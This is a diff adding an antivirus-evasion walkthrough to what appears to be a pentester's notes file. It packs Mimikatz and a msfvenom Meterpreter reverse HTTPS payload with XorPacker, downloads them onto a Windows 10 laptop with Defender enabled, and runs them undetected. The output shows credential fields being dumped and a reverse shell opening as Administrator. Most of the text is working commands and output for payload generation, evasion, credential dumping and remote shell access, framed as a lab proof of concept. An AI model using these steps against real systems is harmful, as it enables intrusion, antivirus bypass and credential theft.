@@ -13,11 +13,12 @@ XorPacker can be used to pack:
 
 
 =========================================================================================================================================================
-PoC - Example with Mimikatz.exe (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+PoC 1 - Example with Mimikatz.exe (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
 =========================================================================================================================================================
 
+------------------------------------------------------------------------------
 Step 1 - Build the tool 'XorPacker' (https://github.com/tmenochet/XorPacker)
-==============================================================================
+------------------------------------------------------------------------------
 
 jeff@kali:~$ cd Documents/Tools/XorPacker-master/
 jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al
@@ -73,8 +74,9 @@ Reading state information... Done
 <SNIP>
 
 
+-------------------------------------------------------------------------------------------------
 Step 2 - Generate an encrypted packed version of the tool Mimikatz.exe (x64) using 'XorPacker'
-========================================================================================================
+-------------------------------------------------------------------------------------------------
 
 
 jeff@kali:~/Documents/Tools/XorPacker-master/$ curl -v http://192.168.1.113:8081/mimikatz.exe -O
@@ -118,8 +120,9 @@ drwxr-xr-x  2 jeff jeff    4096 Dec 21 01:42 __pycache__
 -rwxr-xr-x  1 jeff jeff    2720 Oct 19  2020 xorpacker.py
 
 
+---------------------------------------------------------------------------------------------------------------------------------------------
 Step 3 - Download and execute the packed version of Mimkatz on a Windows 10 laptop without being detected nor blocked by the MS Defender AV
-============================================================================================================================================
+---------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\Users\Administrator.PO718687\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile payload.exe
 
@@ -173,4 +176,145 @@ SID               : S-1-5-21-936125016-2310263949-2175806047-500
         credman :
         cloudap :       KO
         
+<SNIP>
+
+
+
+=========================================================================================================================================================
+PoC 1 - Example with a Meterpreter reverse shell HTTPS (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+=========================================================================================================================================================
+
+----------------------------------------------------------------------------
+Step 1 - Generate a Meterpreter reverse shell HTTPS (x64) using 'Msfvenom'
+----------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.30 LPORT=443 EXITFUNC=thread 
+-a x64 -f exe -x ../Windows/pslist64.exe > meterpreter_rev_https_pslist64.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 653 bytes
+Final size of exe file: 192000 bytes
+
+
+-------------------------------------------------------------------------------------------------------------
+Step 2 - Generate an encrypted packed version of the Meterpreter reverse shell HTTPS (x64) using 'XorPacker'
+-------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ ./xorpacker.py -h
+usage: xorpacker.py [-h] -f FILE [-t {SHELLCODE,MANAGED,UNMANAGED}] [-a {anyCPU,x64,x86}]
+
+Basic packer using XOR encryption
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -f FILE, --file FILE  specify the payload file (default: None)
+  -t {SHELLCODE,MANAGED,UNMANAGED}, --type {SHELLCODE,MANAGED,UNMANAGED}
+                        specify the payload type (default: UNMANAGED)
+  -a {anyCPU,x64,x86}, --arch {anyCPU,x64,x86}
+                        specify the target architecture (only required for packing MANAGED code) (default: anyCPU)
+
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ ./xorpacker.py -f meterpreter_rev_https_pslist64.exe -t UNMANAGED -a x64
+
+[>] Payload file: meterpreter_rev_https_pslist64.exe
+[>] Payload type: UNMANAGED
+
+[*] Encrypting payload...
+[*] Compressing payload...
+[*] Encoding payload...
+[*] Generating source file...
+
+[>] You should now build payload.go
+
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build payload.go 
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al payload.exe 
+-rwxr-xr-x 1 jeff jeff 3365132 Dec 28 10:29 payload.exe
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the packed version of the Meterpreter reverse shell HTTPS (x64) on a Windows 10 laptop without being detected 
+         nor blocked by the MS Defender AV
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.1.113 - - [28/Dec/2022 10:08:53] "GET / HTTP/1.1" 200 -
+192.168.1.113 - - [28/Dec/2022 10:08:57] "GET /payload.exe HTTP/1.1" 200 -  
+
+
+
+
+
+
+
+
+
+jeff@kali:~/Documents/Tools/Windows$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; 
+set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true;  
+run -j"
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use sessions -1 to interact with the 
+last opened session
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+
+msf6 exploit(multi/handler) > jobs -l
+
+Jobs
+====
+
+  Id  Name                    Payload                                Payload opts
+  --  ----                    -------                                ------------
+  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_https  https://192.168.1.30:443
+
+msf6 exploit(multi/handler) > 
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: hs8qwak9) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: hs8qwak9) Staging x64 payload (201308 bytes) ...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: hs8qwak9) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-28 10:31:27 +0100
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid 
+Server username: PO718687\Administrator
+meterpreter > shell
+Process 7828 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.PO718687\Downloads>exit
+exit
+meterpreter > 
+
+
 <SNIP>
